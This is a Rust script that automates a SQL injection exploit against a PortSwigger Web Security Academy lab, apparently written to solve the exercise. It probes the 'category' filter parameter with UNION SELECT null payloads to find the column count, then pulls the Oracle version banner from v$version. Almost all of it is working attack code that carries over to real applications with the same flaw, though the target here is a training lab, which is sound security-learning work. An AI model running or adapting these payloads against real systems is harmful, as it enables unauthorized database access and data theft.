use reqwest::Client;
use scraper::{Html,ElementRef,Selector};
use std::error::Error;

fn fetch_string_literal(html_text: &str) -> String {
    let document = Html::parse_document(html_text);
    let sel = Selector::parse(r#"p[id="hint"]"#).unwrap();
    if let Some(string_value) = document.select(&sel).next() {
        let string = string_value.text().collect::<String>();
        let parts: Vec<&str> = string.split('\'').collect();
        if parts.len() > 1 {
            println!("The target string is: {}", parts[1]);
            return parts[1].to_string();
        }
    }
    String::new()
}

fn string_fetched_final_request(text: &str) -> String {
    let document = Html::parse_document(text);

    document
        .root_element()
        .text()
        .map(str::trim)
        .filter(|s| !s.is_empty())
        .collect::<Vec<_>>()
        .join(" ")
}

fn check_internal_server_error(html_text: &str) -> bool {
    let document = Html::parse_document(html_text);
    let sel = Selector::parse(r#"p[class="is-warning"]"#).unwrap();
    let text = document
        .select(&sel)
        .next()
        .map(|el| el.text().collect::<Vec<_>>().join(" ").trim().to_string());
    println!("{:?}", &text);

    match text {
        Some(ref t) if t == "Internal Server Error" => false,
        Some(_) => true,
        None => true,
    }
}

fn normalize_remove_whitespace(s: &str) -> String {
    s.split_whitespace().collect()
}

fn ascii_sequence(s: &str) -> Vec<u8> {
    s.bytes().collect()
}

fn ascii_subsequence_match(target: &str, haystack: &str) -> bool {
    let t_norm = normalize_remove_whitespace(target);
    let h_norm = normalize_remove_whitespace(haystack);

    let t_seq = ascii_sequence(&t_norm);
    let h_seq = ascii_sequence(&h_norm);

    let t_len = t_seq.len();
    let h_len = h_seq.len();

    if t_len == 0 {
        return false;
    }

    for i in 0..=h_len.saturating_sub(t_len) {
        let mut matched = true;

        for j in 0..t_len {
            if h_seq[i + j] != t_seq[j] {
                matched = false;
                break;
            }
        }

        if matched {
            return true;
        }
    }

    false
}



#[tokio::main]
async fn main() -> Result<(), Box<dyn Error>> {
    let host= "https://0a8200bb040e8e3f8055085a008d0024.web-security-academy.net";
    let endpoint=format!("/filter?category=");
    let client=Client::builder().danger_accept_invalid_certs(true).cookie_store(true).build()?;
    let host_reponse=client.get(host).send().await?;
    let host_response_text=host_reponse.text().await?;
    let mut target_string=fetch_string_literal(&host_response_text);
    let base_payload=format!("{host}{endpoint}'UNION SELECT ");
    let mut nulls: Vec<&str> = vec!["null"];
    let mut from_string="FROM dual";
    let comment="--";
    while true{
        let payload_to_check=format!("{base_payload}{} {from_string}{comment}",nulls.join(","));
        println!("Executed Payload: {}",payload_to_check);
        let response=client.get(payload_to_check).send().await?;
        let response_text=response.text().await?;
        if check_internal_server_error(&response_text)==false{
            nulls.push("null");
        }
        else{
            break
        }}
    nulls[0]="BANNER";
    from_string="FROM v$version";
    let crafted_payload=format!("{base_payload}{} {from_string}{comment}",nulls.join(","));
    println!("Final Payload: {crafted_payload}"); 
    let mut page_visible_text=string_fetched_final_request(&client.get(crafted_payload).send().await?.text().await?);
    target_string=normalize_remove_whitespace(&target_string);
    page_visible_text=normalize_remove_whitespace(&page_visible_text);
    println!("Page visible text: {}",page_visible_text);
    println!("Target String: {}",target_string);
    let matched = ascii_subsequence_match(&target_string, &page_visible_text);
    if matched{
        println!("[+] Lab Solved LESSGOOOOO")
    }
    else{
        println!("Try harder noob!");
    }

    

        Ok(())
    }